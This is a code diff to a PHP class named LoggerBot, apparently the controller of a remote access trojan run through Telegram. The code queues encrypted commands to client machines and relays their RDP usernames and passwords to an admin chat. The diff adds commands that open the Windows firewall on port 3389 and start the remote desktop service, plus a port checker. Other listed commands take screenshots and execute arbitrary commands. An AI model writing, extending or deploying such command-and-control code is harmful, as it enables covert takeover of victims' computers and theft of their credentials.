@@ -302,6 +302,9 @@ class LoggerBot
             $ip = $rdp_data['public_ip'] ?? ($rdp_data['local_ip'] ?? 'unknown');
             $stmt->execute([$ip, $client_id]);
     
+            // Test port 3389
+            $port_status = $this->testPort($ip, 3389);
+    
             // Prepare Telegram message
             $message = "🖥️ RDP Status Update:\n";
             $message .= "Client ID: $client_id\n";
@@ -311,16 +314,18 @@ class LoggerBot
                 $message .= "Public IP: " . ($rdp_data['public_ip'] ?? 'N/A') . "\n";
                 $message .= "Username: {$rdp_data['username']}\n";
                 $message .= "Password: {$rdp_data['password']}\n";
+                $message .= "Port 3389 Status: " . ($port_status ? "Open" : "Closed") . "\n";
                 $message .= "Connect using: mstsc /v:" . ($rdp_data['public_ip'] ?? $rdp_data['local_ip'] ?? 'unknown') . "\n";
             } else {
                 $message .= "Status: Failed\n";
                 $message .= "Error: " . ($rdp_data['message'] ?? 'Failed to enable RDP') . "\n";
+                $message .= "Port 3389 Status: " . ($port_status ? "Open" : "Closed") . "\n";
             }
     
             $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
-            $this->logWebhook("RDP report processed for client_id: $client_id, message: $message");
+            $this->logWebhook("RDP report processed for client_id: $client_id, message: $message, port_status: " . ($port_status ? 'open' : 'closed'));
     
-            return ['status' => 'success'];
+            return ['status' => 'success', 'port_status' => $port_status ? 'open' : 'closed'];
         } catch (Exception $e) {
             $this->logError("RDP report failed for client_id: $client_id, error: " . $e->getMessage());
             http_response_code(500);
@@ -338,7 +343,15 @@ class LoggerBot
                 return ['error' => 'Missing client_id'];
             }
 
-            $command_data = ['type' => 'enable_rdp', 'params' => []];
+            // Enhanced RDP enable command with firewall and port check
+            $command_data = [
+                'type' => 'enable_rdp',
+                'params' => [
+                    'firewall_rule' => 'netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389',
+                    'port_check' => 'netstat -an | find "3389"',
+                    'rdp_service' => 'net start termservice'
+                ]
+            ];
             $encrypted_command = $this->encrypt(json_encode($command_data));
             $stmt = $this->pdo->prepare(
                 "INSERT INTO client_commands (client_id, command, status, created_at) 
@@ -346,7 +359,7 @@ class LoggerBot
             );
             $stmt->execute([$client_id, $encrypted_command]);
 
-            $this->logWebhook("Enable RDP command queued for client_id: $client_id");
+            $this->logWebhook("Enable RDP command queued for client_id: $client_id, params: " . json_encode($command_data));
             return ['status' => 'success', 'message' => 'Enable RDP command queued'];
         } catch (Exception $e) {
             $this->logError("Enable RDP failed: " . $e->getMessage());
@@ -379,6 +392,20 @@ class LoggerBot
             $this->logError("Disable RDP failed: " . $e->getMessage());
             http_response_code(500);
             return ['error' => 'Disable RDP failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function testPort($host, $port, $timeout = 3)
+    {
+        $this->logWebhook("Testing port $port on host $host");
+        $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
+        if ($fp) {
+            fclose($fp);
+            $this->logWebhook("Port $port on $host is open");
+            return true;
+        } else {
+            $this->logError("Port $port on $host is closed or unreachable: $errstr ($errno)");
+            return false;
         }
     }
 
@@ -724,10 +751,11 @@ class LoggerBot
                     $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
                 } elseif ($commandType === 'enable_rdp' || $commandType === 'disable_rdp') {
                     $status = isset($resultData['status']) && $resultData['status'] === 'success' ? 'successful' : 'failed';
-                    $this->sendTelegramMessage(
-                        Config::$ADMIN_CHAT_ID,
-                        "Command '$commandType' on client $clientId: $status\nDetails: " . ($resultData['message'] ?? 'No details')
-                    );
+                    $port_status = $this->testPort($resultData['public_ip'] ?? 'unknown', 3389);
+                    $message = "Command '$commandType' on client $clientId: $status\n";
+                    $message .= "Details: " . ($resultData['message'] ?? 'No details') . "\n";
+                    $message .= "Port 3389 Status: " . ($port_status ? "Open" : "Closed");
+                    $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
                 } else {
                     $this->sendTelegramMessage(
                         Config::$ADMIN_CHAT_ID,
@@ -1017,7 +1045,14 @@ class LoggerBot
                 break;
 
             case preg_match('/^\/enable_rdp$/', $command):
-                $commandData = ['type' => 'enable_rdp', 'params' => []];
+                $commandData = [
+                    'type' => 'enable_rdp',
+                    'params' => [
+                        'firewall_rule' => 'netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389',
+                        'port_check' => 'netstat -an | find "3389"',
+                        'rdp_service' => 'net start termservice'
+                    ]
+                ];
                 $response['data'] = 'Enable RDP command queued';
                 break;
 
@@ -1496,7 +1531,7 @@ class LoggerBot
         $message = "Available commands:\n" .
             "/start - Show client list\n" .
             "/select <client_id> - Select a client\n" .
-            "/status - System status\n" .
+            "/status - Check system status\n" .
             "/screenshot - Take screenshot\n" .
             "/exec <command> - Execute command\n" .
             "/hosts - View hosts file\n" .
